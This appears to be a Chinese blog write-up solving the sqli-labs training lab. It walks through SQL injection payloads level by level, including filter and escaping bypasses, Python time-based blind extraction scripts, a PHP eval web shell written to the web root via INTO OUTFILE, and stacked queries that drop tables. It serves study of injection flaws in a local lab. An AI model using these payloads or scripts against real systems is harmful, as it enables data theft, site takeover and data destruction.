---
title: sqli-labs全收集
date: 2022-08-12 19:03:18
tags:
- sql注入
- mysql
categories:
- web
- 题解
---

# Basic Challenges

### 01-Error Based-Single quotes

> **Error Based: 可以通过报错知道闭合方式**
>
> \> paylod: `?id=1') and ;--+`  
>
> 源码拼接后：
>
> ```sql
> SELECT * FROM users WHERE id=('$id') LIMIT 0,1;
> SELECT * FROM users WHERE id=('1') and ;-- ') LIMIT 0,1;
> ```
>
> \> err: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';-- ') LIMIT 0,1' at line 1`
>
> 可见`')`就是闭合方式



`1' order by 4;--+`

+ 字段数为`3`

`-1' union select 1,database(),3;--+` 

+ 出库名` security` 

`-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security';--+`

+ 出表名`emails,referers,uagents,users`

`-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users';--+`

+ 出列名`id,username,password`

`-1' union select 1,group_concat(password),3 from users;--+`

+ 出 password 字段`Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4`


同理可以出其他数据，不做演示

### 02-Error Based-Integer based

同01 只要去掉-1后面的`'`

### 03-Error Based-Single quotes with twist

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

加了个`()` 我们闭合`(`,注释`)`

`-1') union select 1,database(),3;--+`

完整语句: 

```sql 
SELECT * FROM users WHERE id=('-1') union select 1,database(),3;-- ') LIMIT 0,1
```

其他同理

### 04-Error Based-Double quotes

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

闭合`左"` 和`(`，注释`右"`和`)`

`-1") union select 1,database(),3;--+`

完整语句：

```sql
SELECT * FROM users WHERE id=("-1") union select 1,database(),3;-- " ) LIMIT 0,1
```

### 05-Double injections-Single quotes

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
	if($row) {
        ...
        echo 'You are in...........';
        ...
  	} else {
        ...
        print_r(mysql_error());
        ...
	}
```

只要`mysql_fetch_array`能正确返回数据，前端就回提示`You are in...........`，可以盲注，但是按照出题人的意思应该是要我们报错注入

> 报错形式: `XPATH syntax error: ' emails,referers,uagents,users'`

`1' and updatexml(1,concat(0x0a,(select database())),1); --+`

+ 出库名`security`

`1' and updatexml(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1); --+`

+ 出表名`emails,referers,uagents,users`

... 接下来不演示了

### 06-Double injections-Double quotes

闭合`"` 其他同理

`1" and updatexml(1,concat(0x0a,(select database())),1); --+`

### 07-Dump into outfile

`$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";`

闭合单引号 + `((`

`1')) union select 1,"<?php @eval($_POST['cmd1']);?>",3 into outfile '/var/www/html/hack.php';--+`

写入一句话，直接访问即可

### 08-Blind-Boolian-Single Quotes

跑库名的时间盲注脚本(布尔盲注脚本和这个差不多，就不写两种了),同理可以跑其他数据

```python
import time
import requests


def blind_inject(url, loc, mid, comp='>', target='database()'):
    params = {
        'id': f"1' and if(ascii(substr({target},{loc},1)){comp}{mid}, sleep(0.05),0); -- ",
    }
    time_start = time.time()
    req = requests.get(url=url, params=params)
    time_end = time.time()
    if time_end - time_start > 0.03:
        return 1
    else:
        return 0


url = "http://localhost/Less-8/"
res = ""
end = 0
for i in range(1, 1000):
    l = 32
    r = 126
    while l < r:
        mid = (l + r) // 2
        if blind_inject(url, i, mid):
            l = mid + 1
        else:
            r = mid

        # check end
        if l >= r:
            if not blind_inject(url, i, l, '='):
                end = 1
    if end:
        break
    res += chr(l)
    print(res)
```

> s
> se
> sec
> secu
> secur
> securi
> securit
> security

默认是爆databse()，修改`target`参数可以爆其他

```python
import time
import requests


def blind_inject(url, loc, mid, comp='>', target='database()'):
    params = {
        'id': f"1' and if(ascii(substr({target},{loc},1)){comp}{mid}, sleep(0.05),0); -- ",
    }
    time_start = time.time()
    req = requests.get(url=url, params=params)
    time_end = time.time()
    if time_end - time_start > 0.03:
        return 1
    else:
        return 0


url = "http://localhost/Less-8/"
res = ""
end = 0
for i in range(1, 1000):
    l = 32
    r = 126
    while l < r:
        mid = (l + r) // 2
        if blind_inject(
                url,
                i,
                mid,
                target="(select group_concat(table_name) from information_schema.tables where table_schema='security')"
        ):
            l = mid + 1
        else:
            r = mid

        # check end
        if l >= r:
            target = "(select group_concat(table_name) from information_schema.tables where table_schema='security')"
            if not blind_inject(url, i, l, '=', target=target):
                end = 1
    if end:
        break
    res += chr(l)
    print(res)
```

>e
>em
>ema
>emai
>email
>emails
>emails,
>emails,r
>emails,re
>emails,ref
>emails,refe
>emails,refer
>emails,refere
>emails,referer
>emails,referers
>emails,referers,
>emails,referers,u
>emails,referers,ua
>emails,referers,uag
>emails,referers,uage
>emails,referers,uagen
>emails,referers,uagent
>emails,referers,uagents
>emails,referers,uagents,
>emails,referers,uagents,u
>emails,referers,uagents,us
>emails,referers,uagents,use
>emails,referers,uagents,user
>emails,referers,uagents,users

### 09-Blind-Time based-Single Quotes

同上

### 10-Blind-Time based-Double Quotes

### 11-POST-Error based

```sql
SELECT username, password from users where username='$uname' and password='$passwd' LIMIT 0,1;
```

paylod: `uname=admin' and 1=1;--+&passwd=`

万能密码能过，后续爆数据就简单了

`uname=admin' order by 3;--+&passwd=` > `uname=admin' order by 3;--+&passwd=` 两个字段

`uname=xxxxx' union select database(),1;--+&passwd=` > 出库名 后续不继续演示

### 12-Error Based-Double quotes

paylod: `uname=admin") and 1=1;--+&passwd=`

闭合换一下 同上

### 13-Double Injection- String- with twist

登陆成功无信息回显，使用`updataxml`进行报错注入

`uname=admin') and updatexml(1,concat(0x0a,(select database())),1);--+&passwd=123` > 出库名 后续不做演示

### 14-Double Injection- Double quotes- String

改一下闭合方式

`unmae=admin" and updatexml(1,concat(0x0a,(select database())),1);--+&passwd=123`

### 15-Blind- Boolian Based- String

修改一下盲注的脚本

```python
# BLINE INJECT

import time
import requests


def blind_inject(url, loc, mid, comp='>', target='database()'):
    data = {
        'uname': f"admin' and if(ascii(substr({target},{loc},1)){comp}{mid}, sleep(0.02), 0); -- ",
        'passwd': "123",
    }
    time_start = time.time()
    req = requests.post(url=url, data=data)
    time_end = time.time()
    if time_end - time_start > 0.01:
        return 1
    else:
        return 0


url = "http://localhost/Less-15/"
res = ""
end = 0
for i in range(1, 1000):
    l = 32
    r = 126
    while l < r:
        mid = (l + r) // 2
        target = "database()"
        if blind_inject(url, i, mid, target=target):
            l = mid + 1
        else:
            r = mid

        # check end
        if l >= r:
            target = "database()"
            if not blind_inject(url, i, l, '=', target=target):
                end = 1
    if end:
        break
    res += chr(l)
    print(res)
```

修改target参数可以爆出其他数据 

例如`target = "(select group_concat(table_name) from information_schema.tables where table_schema='security')"`

### 16-Blind- Time Based- Double quotes- String

改一下脚本中的闭合

```python
data = {
    'uname': f"admin\") and if(ascii(substr({target},{loc},1)){comp}{mid}, sleep(0.02), 0); -- ",
    'passwd': "123",
}


```

### 17-Update Query- Error based - String

```php
function check_input($value)
{
	if (!empty($value)) {
	// truncation (see comments)
		$value = substr($value, 0, 15);
	}

	// Stripslashes if magic quotes enabled
	if (get_magic_quotes_gpc()) {
		$value = stripslashes($value);
	}

	// Quote if not a number
	if (!ctype_digit($value)) {
		$value = "'" . mysql_real_escape_string($value) . "'";
	} else {
		$value = intval($value);
	}
	return $value;
}
```

**这次加了点过滤**

1. 如果不空，先截取`uname`的前15个字符

2. 如果 [magic_quotes_gpc](https://php.golaravel.com/info.configuration.html#ini.magic-quotes-gpc) 配置打开了，`stripslashes`删除反斜杠

3. `ctype_digit`检查字符是不是都是数字。如果不是，`mysql_real_escape_string()` 函数转义 SQL 语句中使用的字符串中的特殊字符。

   下列字符受影响：

   + \x00
   + \n
   + \r
   + \
   + '
   + "
   + \x1a

   如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。

   如果都是数字，则正常转数字

**此外 这是个改密码逻辑的页面**

但是发现他只check了uname

```php
if (isset($_POST['uname']) && isset($_POST['passwd'])) {
	//过滤uname
	$uname = check_input($_POST['uname']);
	$passwd = $_POST['passwd'
	//记录passwd和uname
	$fp = fopen('result.txt', 'a');
	fwrite($fp, 'User Name:' . $uname . "\n");
	fwrite($fp, 'New Password:' . $passwd . "\n");
	fclose($fp
	//数据库链接	
	@$sql = "SELECT username, password FROM users WHEusername= $uname LIMIT 0,1
	$result = mysql_query($sql);
	$row = mysql_fetch_array($result);
	//echo $row;
	if ($row) {
		//echo '<font color= "#0000ff">';	
		$row1 = $row['username'];
		//echo 'Your Login name:'. $row1;
		$update = "UPDATE users SET password = '$passwWHERE username='$row1'";
		mysql_query($update);
		echo "<br>
		if (mysql_error()) {
			echo '<font color= "#FFFF00" font size = 3 >';
			print_r(mysql_error());
			echo "</br></br>";
			echo "</font>";
		} else {
			echo '<font color= "#FFFF00" font size = 3 >';
			//echo " You password has been successfulupdated " ;		
			echo "<br>";
			echo "</font>";
	
		echo '<img src="../images/flag1.jpg"   />';
		//echo 'Your Password:' .$row['password'];
		echo "</font>";
	} else {
		echo '<font size="4.5" color="#FFFF00">';
		//echo "Bug off you Silly Dumb hacker";
		echo "</br>";
		echo '<img src="../images/slap1.jpg"   />
		echo "</font>";
	}
}
```

我们提供一个存在的uname

```php
$update = "UPDATE users SET password = '$passwd' WHERE username='$row1'";
```

对于update语句，发现可以使用报错注入

paylod: `uname=admin&passwd=admin' and updatexml(1,concat(0x0a,database()),1); --+`

其他同理

### 18-Header Injection- Error Based- string

这题给了个IP的回显，并且对uname和passwd都做了过滤，如果成功登入还会显示你的uagents

```php
	$uagent = $_SERVER['HTTP_USER_AGENT'];
	$IP = $_SERVER['REMOTE_ADDR'];
	echo "<br>";
	echo 'Your IP ADDRESS is: ' .$IP;
	echo "<br>";
```

```php
	$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
	if($row1) {
		...
		$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
		mysql_query($insert);
		...
		echo 'Your User Agent is: ' .$uagent;
		...
		print_r(mysql_error());			
		...
	}
```

可以发现`uname`和`passwd`不好注，但`uagent`是完全没有过滤的

User-Agent: `1',1,updatexml(1,concat(0x0a,database()),1));-- '`

**注意 sql语句中的反引号 \`,会影响`--+`的注释，所以可以使用`#(%23)`或者使用`--+'`把后面单引号或者反引号闭合**

```sql
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1',1,updatexml(1,concat(0x0a,database()),1));-- '`, '$IP', $uname)
```

User-Agent: `1',1,updatexml(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1));-- '`

### 19-Header Injection- Referer- Error Based- string

这次把uagent换成了referer, paylod同上

### 20-Cookie Injection- Error Based- string

```php
setcookie('uname', $cookee, time()+3600);	
header ('Location: index.php');
```

有这么一句话，将uname设为cookie，然后重定向至首页，

<img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220327164820673.png" alt="image-20220327164820673" style="zoom:50%;" />

这个页面中，有

```php
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
$result=mysql_query($sql);
```

所以我们可以抓第二次重定向的包修改cookie来操作

`admin'and updatexml(1,concat(0x0a,database()),1)--+`即可 ， 其他略

# Advanced Injections

### 21-Cookie Injection- Error Based- complex - string

这里发现cookie被base64编码了，我们只需要将之前的payload也编码一下就行

`admin') and updatexml(1,concat(0x0a, database()),1)#`

 \>> `YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4MGEsIGRhdGFiYXNlKCkpLDEpIw==`

### 22-Cookie Injection- Error Based- Double Quotes - string

`admin" and 1#`

这里是双引号闭合了

`admin" and updatexml(1,concat(0x0a, database()),1)#`

\>>`YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgwYSwgZGF0YWJhc2UoKSksMSkj`



### 23-Error Based- no comments

```php
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);

// connectivity 
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

if($row)
	...
```

把id中的注释符都过滤掉了,但是我们仍然可以闭合`''`来解决

paylod: `1' and updatexml(1,concat(0x0a,database()),1) and '`

```sql
SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x0a,database()),1) and '' LIMIT 0,1
```

只闭合前一个单引号会报错，所以我们将第二个单引号也闭合，就可以不用注释符出数据

接下来就是常规一条龙

`1' and updatexml(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1) and ' `

`1' and updatexml(1,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='users')),1) and '`

`1' and updatexml(1,concat(0x0a,(select group_concat(username) from users)),1) and '`

以上是**报错注入**，但是会有字符串长度限制，可以用substr分段获取

---

也可以用**联合查询**

先确定字段数

`-1' union select 1,2,'3`

`-1' union select '1', (select database()), '3`

`-1' union select '1', (select group_concat(table_name) from information_schema.tables where table_schema='security'), '3`

`-1' union select '1', (select group_concat(column_name) from information_schema.columns where table_schema='security'), '3`

`-1' union select '1', (select group_concat(username) from users limit 0,1), '3`

### 24-Second Degree Injections

<img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403091029566.png" alt="image-20220403091029566" style="zoom:67%;" />

<img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403091050057.png" alt="image-20220403091050057" style="zoom:67%;" />

内容比较多, 先看Login按钮进入的login.php

```php
function sqllogin()
{
    $username = mysql_real_escape_string($_POST["login_user"]);
    $password = mysql_real_escape_string($_POST["login_password"]);
    $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
    $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
    $row = mysql_fetch_row($res);
    //print_r($row) ;
    if ($row[1]) {
        return $row[1];
    } else {
        return 0;
    }

}
$login = sqllogin();
if (!$login == 0) {
    $_SESSION["username"] = $login;
    setcookie("Auth", 1, time() + 3600); /* expire in 15 Minutes */
    header('Location: logged-in.php');
} else {
    echo "bug offffff";
    .....
}
```

`mysql_real_escape_string()` 函数转义 SQL 语句中使用的字符串中的特殊字符。

下列字符受影响：

+ \x00
+ \n
+ \r
+ \
+ '
+ "
+ \x1a

如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。

我们常用的闭合方法不好使了。

接下来看注册新用户界面

跟登陆一样，使用了转义函数，但是在Insert信息的时候保留了转义的内容，那么我们的用户名就可以`admin' #`

<img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403092850338.png" alt="image-20220403092850338" style="zoom:67%;" />

这样 登陆的时候 这个时候我们如果登陆我们自己的`admin' #`账户

然后修改密码，后台的sql语句会变成

```sql
UPDATE users SET PASSWORD='$pass' where username='admin' #' and password='$curr_pass' 
```

这意味着我们如果更改`admin' #`的密码，会将admin的密码改掉

> 为什么这里获取username的时候不带转义符
>
> 因为后台此处username是从session中读取的，而session中的username是返回的`admin' #`登陆时SQL语句返回的username, `\`转义符在sql语句中之后就没了，直接变成`username = admin' #`

**因此我们就可以任意登陆admin的账号了**

### 25 Trick with OR & AND

这里把or和and给过滤了，且不区分大小写

```php
function blacklist($id)
{
    $id = preg_replace('/or/i', "", $id); //strip out OR (non case sensitive)
    $id = preg_replace('/AND/i', "", $id); //Strip out AND (non case sensitive)

    return $id;
}
```

所以如果要`1' and 1=1;--+`，可以使用双写绕过`1' aandnd 1=1;--+`

paylod:

`111' union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata;%23`

这里注意 `information_schema`中的or也会被替换,所以双写 `infoorrmation_schema`

剩下 略

**此外** 还可以用`||`代替`or`来报错注入

注意 如果使用`&&`要用`%26%26`

`1' || updatexml(0,concat(0x0a,database()),0)%23`

### 25a-Trick with OR & AND Blind

和上一题一样，只不过变成整型了

`?id=1 oorr 1=1%23`

`111 union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata;%23`

略

### 26 Trick with comments

这次加上注释和空格也给过滤了

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);	//Strip out slashes
	return $id;
}
```

可以用00截断来代替注释`1'oorr'1'='1';%00`

值得注意的是，虽然空格被过滤了，但是我们还是有几种方法绕过的。

上面这种加单引号可以，还可以用括号包裹`1'oorr(1=1);%00`

接下来来一段报错注入

`1'oorr(updatexml(0,concat(0x7e,database()),0));%00`

结尾还可以换一种方式

`1'oorr(updatexml(0,concat(0x7e,database()),0))oorr'1'='1`

`1'oorr(updatexml(0,concat(0x7e,(select(group_concat(schema_name))from(infoorrmation_schema.schemata))),0))oorr'1'='1`

`1'oorr(updatexml(0,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),0))oorr'1'='1`

...

**这里用`%a0`也可以代替空格`1'oorr%a01=1;%00`**

### 26a Trick with comments

这题把`print_r(mysql_error());`给注释掉了，报错注入不好使了,就联合查询吧，用%a0代替空格

`-111')%a0union%a0select(1),(select(group_concat(schema_name))from(infoorrmation_schema.schemata)),(3)||('0`

`-111')%a0union%a0select(1),(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),(3)||('0`

...略

### 27 Trick with SELECT & UNION

select,union过滤了

```php
function blacklist($id)
{
    $id = preg_replace('/[\/\*]/', "", $id); //strip out /*
    $id = preg_replace('/[--]/', "", $id); //Strip out --.
    $id = preg_replace('/[#]/', "", $id); //Strip out #.
    $id = preg_replace('/[ +]/', "", $id); //Strip out spaces.
    $id = preg_replace('/select/m', "", $id); //Strip out spaces.
    $id = preg_replace('/[ +]/', "", $id); //Strip out spaces.
    $id = preg_replace('/union/s', "", $id); //Strip out union
    $id = preg_replace('/select/s', "", $id); //Strip out select
    $id = preg_replace('/UNION/s', "", $id); //Strip out UNION
    $id = preg_replace('/SELECT/s', "", $id); //Strip out SELECT
    $id = preg_replace('/Union/s', "", $id); //Strip out Union
    $id = preg_replace('/Select/s', "", $id); //Strip out select
    return $id;
}
```

注意这里select被替换了好几次，所以双写绕过的时候要多几次

比如`-111'%0auniounionn%0aselecsselectelectt%0a1,2,3||'`

这题我们不用双写，因为过滤对大小写的判断不严格

`-111'%0auNion%0aSeLECT%0a1,database(),3||'`

`-111'%0auNion%0aSeLECT%0a1,(seLect(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),3||'`

...略

###  27 Trick with SELECT & UNION

换个闭合方式，其余同上

`-111"%0aUnioN%0aseLect%0a1,2,3|| "`

### 28 Trick with SELECT & UNION

这次是把union select合起来过滤

```php
function blacklist($id)
{
    $id = preg_replace('/[\/\*]/', "", $id); //strip out /*
    $id = preg_replace('/[--]/', "", $id); //Strip out --.
    $id = preg_replace('/[#]/', "", $id); //Strip out #.
    $id = preg_replace('/[ +]/', "", $id); //Strip out spaces.
    //$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.
    $id = preg_replace('/[ +]/', "", $id); //Strip out spaces.
    $id = preg_replace('/union\s+select/i', "", $id); //Strip out UNION & SELECT.
    return $id;
}
```

我们可以组合起来双写绕过

`-111')%0aunion%0aunion%0aselectselect%0a1,database(),3 || ('`

...略

### 28a Trick with SELECT & UNION

这次过滤只剩`$id= preg_replace('/union\s+select/i',"", $id); `了，随便绕

`-111') union union select select 1,database(),3|| ('`

...略

### 29-31 WAF绕过

ubuntu上没弄jsp环境 略

### 32 Bypass addslashes()

```php
function check_addslashes($string)
{
    $string = preg_replace('/' . preg_quote('\\') . '/', "\\\\\\", $string); //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string); //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string); //escape double quote with a backslash
    return $string;
}
```

`preg_quote()` 需要参数 str 并向其中 每个正则表达式语法中的字符前增加一个反斜线。 

正则表达式特殊字符有： . \ + * ? [ ^ ] $ ( ) { } = ! < > | : -

`preg_replace` 函数执行一个正则表达式的搜索和替换。

这题将`\  '  "`都给转义了

来一发宽字节注入

`-1%df' union select 1,2,3; %23`

后台在给`'`转义后变成了 `\'`,所以sql语句变成了`-1%df%5c' union select 1,2,3; %23`

%df%5c在gbk编码下成了`運`,后面的`'`就可以正常闭合了

`-1%df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3; %23`

这里注意where后面语句可以用十六进制来绕过单引号的限制

### 33 Bypass addslashes()

```php
function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}
```

和上一题一模一样，只是换成了php自带的addslashes

addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：

+ 单引号（'）
+ 双引号（"）
+ 反斜杠（\）
+ NULL

### 34 Bypass Add SLASHES

这次还是对password和uname进行addslashes, 但是这次是post传参，
Hackbar在处理宽字节注入的时候对于'%'有点问题，具体可见
https://github.com/0140454/hackbar/issues/4 ,所以我们抓包解决
paylod: `passwd=12&uname=-111%df'+union+select+1,database();%23`


### 35 why care for addslashes()

这次id是整型，不用单引号

`-1111 union select 1,database(),3;--+`

`-1111 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3;--+`

...


### 36 Bypass MySQL Real Escape String

```php
function check_quotes($string)
{
    $string = mysql_real_escape_string($string);
    return $string;
}
```

用了`mysql_real_escape_string`来过滤输入，转义 SQL 语句中使用的字符串中的特殊字符。

下列字符受影响：

+ \x00
+ \n
+ \r
+ \
+ '
+ "
+ \x1a

如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。

套路同上

### 37 MySQL_real_escape_string

`uname=1%df'+union+select+database(),2%23&passwd=1`

post传参,依然是用Burpsuite,套路同上

### 38 stacked Query

引出堆叠注入的内容，没有其他特殊的

`1'; create table test like users;%23`

`1'; drop table users;%23`

## Stacked Injections

### 39 stacked Query Intiger type

同38 改成整型

`1; create table test like users;%23`

...

### 40 stacked Query String type Blind

经典换汤不换药

闭合改成 `')`

### 41 stacked Query Intiger type blind

同上 改成整型 多了个报错而已。

### 42 Stacked Query error based 

账号被过滤 密码没有，在密码里写堆叠注入

账号随便写

密码:`a' create table test like users;%23`

密码:`a' drop table test;%23`

### 43 Stacked Query

同上 闭合换`')`


### 44 Stacked Query Blind

同上 闭合`'`

(所谓blind就是没错误回显

### 45 Stacked Query Blind

同上 闭合`')`

### 46 ORDER BY-Error-Numeric

查询语句:`SELECT * FROM users ORDER BY $id`

这题要提供的参数是`order by`后面的字段

报错注入可行: `1 and updatexml(0,concat(0x7e,database()),0)%23`

`1 and updatexml(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),0)%23`
...

### 47 ORDER BY Clause-Error-Single quote

闭合`'`，其余同上

`1' and updatexml(0,concat(0x7e,database()),0)%23`

### 48 ORDER BY Clause Blind based

把报错删了，可以盲注

```python
# BLIND INJECT

import time
import requests


def blind_inject(url, loc, mid, comp='>', target='database()'):
    params = {
        'sort': f"1 and if(ascii(substr({target},{loc},1)){comp}{mid}, sleep(0.02),0); -- ",
    }
    time_start = time.time()
    req = requests.get(url=url, params=params)
    time_end = time.time()
    if time_end - time_start > 0.01:
        return 1
    else:
        return 0


url = "http://localhost/Less-48/"
# target = "database()"
target = "(select group_concat(table_name) from information_schema.tables where table_schema='security')"
# target = "(select group_concat(column_name) from information_schema.columns where table_name='user')"
res = ""
end = 0
for i in range(1, 1000):
    l = 32
    r = 126
    while l < r:
        mid = (l + r) // 2
        if blind_inject(url, i, mid, target=target):
            l = mid + 1
        else:
            r = mid

        # check end
        if l >= r:
            if not blind_inject(url, i, l, '=', target=target):
                end = 1
    if end:
        break
    res += chr(l)
    print(res)
```

### 49 ORDER BY Clause Blind based

同上 闭合改成单引号

### 50 ORDER BY Clause Stacked injection

mysql请求语句用的是`mysqli_multi_query`，可以堆叠注入

`1;create table test like users;%23`

`1;drop table test;%23`

### 51 ORDER BY Clause Stacked injection

单引号闭合

`1';create table test like users;%23`

`1';drop table test;%23`

### 52 ORDER BY Clause Stacked injection

无报错版本依葫芦画瓢

整型

### 53 ORDER BY Clause Stacked injection

无报错版本依葫芦画瓢

单引号闭合

## Challenges

### 54 Challengs-1

`?id=1`

`?id=1'`

`?id=1' order by 4;%23`

`?id=1' order by 3;%23`

`?id=-1' union select 1,2,3;%23`

`?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata);%23`


`?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges');%23`

`?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='HBGWD6KDWA');%23`

`?id=-1' union select 1,2,(select group_concat(secret_VXO7) from challenges.HBGWD6KDWA);%23`

拿到key

### 55 Challengs-1

闭合改成`)`
同上

### 56 Challengs-1

闭合改成`')`
同上

### 57 Challengs-1

闭合改成`"`
同上

### 58 Challengs-2

`?id=-1' and updatexml(0,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),0);%23`

`?id=-1' and updatexml(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')),0);%23`

`?id=-1' and updatexml(0,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='RB8A94YYQK')),0);%23`

`?id=-1' and updatexml(0,concat(0x7e,(select group_concat(secret_AQ5T) from challenges.RB8A94YYQK)),0);%23`

拿到key

### 59 Challengs-2

闭合改成整型
同上

### 60 Challengs-2

闭合改成`")`
同上

### 61 Challengs-2

闭合改成`))`
同上

### 62 Challengs-3

盲注

```python 
# BLINE INJECT

import time
import requests


# uname=admin' and if(ascii(substr(select (database())),{},1),sleep(1),0);--+&passwd=123
def blind_inject(url, loc, mid, comp='>', target='database()'):
    params = {
        'id': f"1') and if(ascii(substr({target},{loc},1)){comp}{mid}, sleep(0.04),0); -- ",
    }
    time_start = time.time()
    req = requests.get(url=url, params=params)
    time_end = time.time()
    if time_end - time_start > 0.03:
        return 1
    else:
        return 0


url = "http://localhost/Less-62/"
# target = "database()"
# target = "(select group_concat(table_name) from information_schema.tables where table_schema='challenges')"
# target = "(select group_concat(column_name) from information_schema.columns where table_name='EUA0BMHZ9V')"
target = "(select group_concat(secret_WC6I) from challenges.EUA0BMHZ9V)"
res = ""
end = 0
for i in range(1, 1000):
    l = 32
    r = 126
    while l < r:
        mid = (l + r) // 2
        if blind_inject(url, i, mid, target=target):
            l = mid + 1
        else:
            r = mid

        # check end
        if l >= r:
            if not blind_inject(url, i, l, '=', target=target):
                end = 1
    if end:
        break
    res += chr(l)
    print(res)
```


### 63 Challengs-3

闭合改成`'`
同上


### 64 Challengs-3

闭合改成`))`
同上

### 65 Challengs-3

闭合改成`)`
同上
